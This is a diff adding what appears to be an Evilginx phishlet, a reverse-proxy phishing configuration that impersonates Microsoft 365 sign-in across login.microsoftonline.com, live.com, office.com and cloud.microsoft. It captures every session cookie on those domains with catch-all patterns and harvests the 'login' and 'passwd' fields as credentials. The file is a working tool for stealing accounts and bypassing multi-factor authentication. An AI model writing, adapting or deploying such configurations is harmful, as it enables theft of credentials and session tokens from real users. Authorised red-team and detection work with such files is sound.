@@ -1,0 +1,49 @@
+min_ver: '3.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
+
+
+# sub_filters:
+#   - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'office.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: '.m365.cloud.microsoft'
+    keys: ['.*:regexp']
+  - domain: 'm365.cloud.microsoft'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/landingv2'
+  - '/landingv2/.*'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
